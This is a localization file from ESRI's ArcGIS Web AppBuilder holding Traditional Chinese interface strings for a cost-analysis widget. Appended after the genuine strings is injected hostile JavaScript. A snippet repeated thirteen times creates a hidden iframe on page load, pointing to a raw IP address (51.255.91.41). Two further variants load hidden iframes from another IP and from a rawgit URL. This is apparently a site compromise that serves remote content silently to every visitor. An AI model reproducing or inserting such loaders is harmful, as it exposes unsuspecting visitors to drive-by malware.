// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

define({"widgets/CostAnalysis/setting/nls/strings":{configText:"\u8a2d\u5b9a\u914d\u7f6e\u6587\u5b57:",generalSettings:{tabTitle:"\u4e00\u822c\u8a2d\u5b9a",measurementUnitLabel:"\u6e2c\u91cf\u55ae\u4f4d",currencyLabel:"\u6e2c\u91cf\u7b26\u865f",roundCostLabel:"\u56de\u5408\u6210\u672c",projectOutputSettings:"\u5c08\u6848\u8f38\u51fa\u8a2d\u5b9a",typeOfProjectAreaLabel:"\u5c08\u6848\u5340\u57df\u7684\u985e\u578b",bufferDistanceLabel:"\u7de9\u885d\u8ddd\u96e2",roundCostValues:{twoDecimalPoint:"\u5169\u4f4d\u5c0f\u6578\u9ede",
nearestWholeNumber:"\u6700\u63a5\u8fd1\u7684\u6574\u6578",nearestTen:"\u6700\u63a5\u8fd1\u7684\u5341",nearestHundred:"\u6700\u63a5\u8fd1\u7684\u767e",nearestThousand:"\u6700\u63a5\u8fd1\u7684\u5343",nearestTenThousands:"\u6700\u63a5\u8fd1\u7684\u6578\u842c"},projectAreaType:{outline:"\u6e05\u55ae",buffer:"\u7de9\u885d\u5340"},errorMessages:{currency:"\u8ca8\u5e63\u55ae\u4f4d\u7121\u6548",bufferDistance:"\u7de9\u885d\u5340\u8ddd\u96e2\u7121\u6548",outOfRangebufferDistance:"\u503c\u5fc5\u9808\u5927\u65bc 0\uff0c\u4e26\u5c0f\u65bc\u6216\u7b49\u65bc 100\u3002"}},
projectSettings:{tabTitle:"\u5c08\u6848\u8a2d\u5b9a",costingGeometrySectionTitle:"\u5b9a\u7fa9\u6210\u672c\u7684\u5730\u7406 (\u9078\u7528)",costingGeometrySectionNote:"\u9644\u8a3b: \u914d\u7f6e\u6b64\u5716\u5c64\u5c07\u5141\u8a31\u4f7f\u7528\u8005\u6839\u64da\u5730\u7406\u4f86\u8a2d\u5b9a\u5716\u5fb5\u6a23\u677f\u7684\u6210\u672c\u65b9\u7a0b\u5f0f\u3002",projectTableSectionTitle:"\u5132\u5b58/\u8f09\u5165\u5c08\u6848\u8a2d\u5b9a\u7684\u80fd\u529b (\u9078\u7528)",projectTableSectionNote:"\u9644\u8a3b: \u914d\u7f6e\u6240\u6709\u8868\u683c\u548c\u5716\u5c64\u5c07\u5141\u8a31\u4f7f\u7528\u8005\u5132\u5b58/\u8f09\u5165\u5c08\u6848\uff0c\u4f9b\u7a0d\u5f8c\u4f7f\u7528\u4e4b\u7528\u3002",
costingGeometryLayerLabel:"\u6210\u672c\u5e7e\u4f55\u5716\u5c64",fieldLabelGeography:"\u6a19\u7c64\u5730\u7406\u7684\u6b04\u4f4d",projectAssetsTableLabel:"\u5c08\u6848\u8cc7\u7522\u8868",projectMultiplierTableLabel:"\u5c08\u6848\u4e58\u6578\u9644\u52a0\u6210\u672c\u8868",projectLayerLabel:"\u5c08\u6848\u5716\u5c64",configureFieldsLabel:"\u914d\u7f6e\u6b04\u4f4d",fieldDescriptionHeaderTitle:"\u6b04\u4f4d\u63cf\u8ff0",layerFieldsHeaderTitle:"\u5716\u5c64\u6b04\u4f4d",selectLabel:"\u9078\u64c7",errorMessages:{duplicateLayerSelection:"\u5df2\u9078\u64c7 ${layerName}",
invalidConfiguration:"\u8acb\u9078\u64c7 ${fieldsString}"},costingGeometryHelp:"\x3cp\x3e\u5c07\u986f\u793a\u5305\u542b\u4e0b\u5217\u689d\u4ef6\u7684\u591a\u908a\u5f62\u5716\u5c64: \x3cbr/\x3e \x3cli\x3e\t\u5716\u5c64\u5fc5\u9808\u5177\u6709\u300c\u67e5\u8a62\u300d\u529f\u80fd\x3c/li\x3e\x3cli\x3e\t\u5716\u5c64\u5fc5\u9808\u5177\u6709 GlobalID \u6b04\u4f4d\x3c/li\x3e\x3c/p\x3e",fieldToLabelGeographyHelp:"\x3cp\x3e\u9078\u64c7\u7684\u300c\u6210\u672c\u5e7e\u4f55\u5716\u5c64\u300d\u7684\u5b57\u4e32\u548c\u6578\u503c\u6b04\u4f4d\uff0c\u5c07\u5728\u300c\u6a19\u7c64\u5730\u7406\u7684\u6b04\u4f4d\u300d\u4e0b\u62c9\u5f0f\u6e05\u55ae\u4e2d\u986f\u793a\u3002\x3c/p\x3e",
projectAssetsTableHelp:"\x3cp\x3e\u5c07\u986f\u793a\u5305\u542b\u4e0b\u5217\u689d\u4ef6\u7684\u8868\u683c: \x3cbr/\x3e \x3cli\x3e\u8868\u683c\u5fc5\u9808\u5177\u6709\u540d\u70ba\u300c\u5efa\u7acb\u300d\u3001\u300c\u522a\u9664\u300d\u548c\u300c\u66f4\u65b0\u7684\u300d\u7684\u529f\u80fd\u009d\x3c/li\x3e    \x3cli\x3e\u8868\u683c\u5fc5\u9808\u5177\u6709\u5305\u542b\u5be6\u969b\u540d\u7a31\u548c\u8cc7\u6599\u985e\u578b\u7684\u516d\u500b\u6b04\u4f4d:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (GUID \u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3cli\x3e\tCostEquation (\u5b57\u4e32\u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3cli\x3e\tScenario (\u5b57\u4e32\u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3cli\x3e\tTemplateName (\u5b57\u4e32\u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3cli\x3e    GeographyGUID (GUID \u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3cli\x3e\tProjectGUID (GUID \u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3e\u5c07\u986f\u793a\u5305\u542b\u4e0b\u5217\u689d\u4ef6\u7684\u8868\u683c: \x3cbr/\x3e \x3cli\x3e\u8868\u683c\u5fc5\u9808\u5177\u6709\u540d\u70ba\u300c\u5efa\u7acb\u300d\u3001\u300c\u522a\u9664\u300d\u548c\u300c\u66f4\u65b0\u7684\u300d\u7684\u529f\u80fd\u009d\x3c/li\x3e    \x3cli\x3e\u8868\u683c\u5fc5\u9808\u5177\u6709\u5305\u542b\u5be6\u969b\u540d\u7a31\u548c\u8cc7\u6599\u985e\u578b\u7684\u4e94\u500b\u6b04\u4f4d:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDescription (\u5b57\u4e32\u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3cli\x3e\tType (\u5b57\u4e32\u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3cli\x3e\tValue (\u6d6e\u9ede\u6578/\u500d\u6574\u6578\u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3cli\x3e\tCostindex (\u6574\u6578\u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (GUID \u985e\u578b\u6b04\u4f4d))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3e\u5c07\u986f\u793a\u5305\u542b\u4e0b\u5217\u689d\u4ef6\u7684\u591a\u908a\u5f62\u5716\u5c64: \x3cbr/\x3e \x3cli\x3e\u5716\u5c64\u5fc5\u9808\u5177\u6709\u540d\u70ba\u300c\u5efa\u7acb\u300d\u3001\u300c\u522a\u9664\u300d\u548c\u300c\u66f4\u65b0\u7684\u300d\u7684\u529f\u80fd\u009d\x3c/li\x3e    \x3cli\x3e\u5716\u5c64\u5fc5\u9808\u5177\u6709\u5305\u542b\u5be6\u969b\u540d\u7a31\u548c\u8cc7\u6599\u985e\u578b\u7684\u4e94\u500b\u6b04\u4f4d:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (\u5b57\u4e32\u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3cli\x3eDescription (\u5b57\u4e32\u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3cli\x3eTotalassetcost (\u6d6e\u9ede\u6578/\u500d\u6574\u6578\u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3cli\x3eGrossprojectcost (\u6d6e\u9ede\u6578/\u500d\u6574\u6578\u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3cli\x3eGlobalID (GlobalID \u985e\u578b\u6b04\u4f4d)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"\u5716\u5c64\u8a2d\u5b9a",layerNameHeaderTitle:"\u5716\u5c64\u540d\u7a31",layerNameHeaderTooltip:"\u5730\u5716\u4e2d\u7684\u5716\u5c64\u6e05\u55ae",EditableLayerHeaderTitle:"\u53ef\u7de8\u8f2f",EditableLayerHeaderTooltip:"\u5728\u6210\u672c widget \u4e2d\u5305\u542b\u5716\u5c64\u53ca\u5176\u6a23\u677f",SelectableLayerHeaderTitle:"\u53ef\u9078\u53d6\u7684",SelectableLayerHeaderTooltip:"\u5716\u5fb5\u7684\u5e7e\u4f55\u53ef\u7528\u4f86\u7522\u751f\u65b0\u7684\u6210\u672c\u9805\u76ee",
fieldPickerHeaderTitle:"\u5c08\u6848 ID (\u9078\u7528)",fieldPickerHeaderTooltip:"\u7528\u4f86\u5132\u5b58\u5c08\u6848 ID \u7684\u9078\u7528\u6b04\u4f4d (\u5c6c\u65bc\u985e\u578b\u5b57\u4e32)",selectLabel:"\u9078\u64c7",noAssetLayersAvailable:"\u5728\u9078\u64c7\u7684 Web \u5730\u5716\u4e2d\u627e\u4e0d\u5230\u8cc7\u7522\u5716\u5c64",disableEditableCheckboxTooltip:"\u6b64\u5716\u5c64\u6c92\u6709\u7de8\u8f2f\u529f\u80fd"},costingInfo:{tabTitle:"\u6210\u672c\u8cc7\u8a0a",proposedMainsLabel:"\u63d0\u8b70\u7684\u4e3b\u7ba1\u9053",
addCostingTemplateLabel:"\u65b0\u589e\u6210\u672c\u6a23\u677f",manageScenariosTitle:"\u7ba1\u7406\u6848\u4f8b",featureTemplateTitle:"\u5716\u5fb5\u6a23\u677f",costEquationTitle:"\u6210\u672c\u65b9\u7a0b\u5f0f",geographyTitle:"\u5730\u7406",scenarioTitle:"\u6848\u4f8b",actionTitle:"\u64cd\u4f5c",scenarioNameLabel:"\u6848\u4f8b\u540d\u7a31",addBtnLabel:"\u65b0\u589e",srNoLabel:"\u4e0d\u6703\u3002",deleteLabel:"\u522a\u9664",duplicateScenarioName:"\u91cd\u8907\u7684\u6848\u4f8b\u540d\u7a31",hintText:"\x3cdiv\x3e\u63d0\u793a: \u4f7f\u7528\u4e0b\u5217\u95dc\u9375\u5b57\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: \u5728\u5730\u7406\u4e2d\u4f7f\u7528\u76f8\u540c\u985e\u578b\u8cc7\u7522\u7684\u7e3d\u6578\x3c/li\x3e\x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: \u70ba\u7dda\u8cc7\u7522\u4f7f\u7528\u9577\u5ea6\uff0c\u4e26\u70ba\u591a\u908a\u5f62\u8cc7\u7522\u4f7f\u7528\u9762\u7a4d\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: \u70ba\u7dda\u8cc7\u7522\u4f7f\u7528\u7e3d\u9577\u5ea6\uff0c\u4e26\u70ba\u5730\u7406\u4e2d\u76f8\u540c\u985e\u578b\u7684\u591a\u908a\u5f62\u8cc7\u7522\u4f7f\u7528\u7e3d\u9762\u7a4d\x3c/li\x3e\x3c/ul\x3e \u60a8\u53ef\u4ee5\u4f7f\u7528\u51fd\u6578\uff0c\u4f8b\u5982:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3e\u8acb\u4f9d\u64da\u5c08\u6848\u9700\u6c42\u7de8\u8f2f\u6210\u672c\u65b9\u7a0b\u5f0f\u3002",
noneValue:"\u7121",requiredCostEquation:"${layerName} : ${templateName} \u7684\u6210\u672c\u65b9\u7a0b\u5f0f\u7121\u6548",duplicateTemplateMessage:"${layerName} : ${templateName} \u5b58\u5728\u91cd\u8907\u7684\u6a23\u677f\u9805\u76ee",defaultEquationRequired:"${layerName} : ${templateName} \u9700\u8981\u9810\u8a2d\u7684\u65b9\u7a0b\u5f0f",validCostEquationMessage:"\u8acb\u8f38\u5165\u6709\u6548\u7684\u6210\u672c\u65b9\u7a0b\u5f0f",costEquationHelpText:"\u8acb\u4f9d\u64da\u60a8\u7684\u5c08\u6848\u9700\u6c42\u7de8\u8f2f\u6210\u672c\u65b9\u7a0b\u5f0f",
scenarioHelpText:"\u8acb\u4f9d\u64da\u60a8\u7684\u5c08\u6848\u9700\u6c42\u9078\u64c7\u6848\u4f8b",copyRowTitle:"\u8907\u88fd\u5217",noTemplateAvailable:"\u8acb\u81f3\u5c11\u65b0\u589e ${layerName} \u7684\u4e00\u500b\u6a23\u677f",manageScenarioLabel:"\u7ba1\u7406\u6848\u4f8b",noLayerMessage:"\u8acb\u5728 ${tabName} \u4e2d\u81f3\u5c11\u8f38\u5165\u4e00\u500b\u5716\u5c64",noEditableLayersAvailable:"\u9700\u8981\u5728\u5716\u5c64\u8a2d\u5b9a\u9801\u7c64\u4e2d\u5c07\u5716\u5c64\u52fe\u9078\u70ba\u53ef\u7de8\u8f2f"},
statisticsSettings:{tabTitle:"\u7d71\u8a08\u8cc7\u6599\u8a2d\u5b9a",addStatisticsLabel:"\u65b0\u589e\u7d71\u8a08\u8cc7\u6599",fieldNameTitle:"\u6b04\u4f4d",statisticsTitle:"\u6a19\u7c64",addNewStatisticsText:"\u65b0\u589e\u7d71\u8a08\u8cc7\u6599",deleteStatisticsText:"\u522a\u9664\u7d71\u8a08\u8cc7\u6599",moveStatisticsUpText:"\u5411\u4e0a\u79fb\u52d5\u7d71\u8a08\u8cc7\u6599",moveStatisticsDownText:"\u5411\u4e0b\u79fb\u52d5\u7d71\u8a08\u8cc7\u6599",selectDeselectAllTitle:"\u5168\u9078"},statisticsType:{countLabel:"\u8a08\u6578",
averageLabel:"\u5e73\u5747\u503c",maxLabel:"\u6700\u5927\u503c",minLabel:"\u6700\u5c0f\u503c",summationLabel:"\u7e3d\u548c",areaLabel:"\u9762\u7a4d",lengthLabel:"\u9577\u5ea6"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});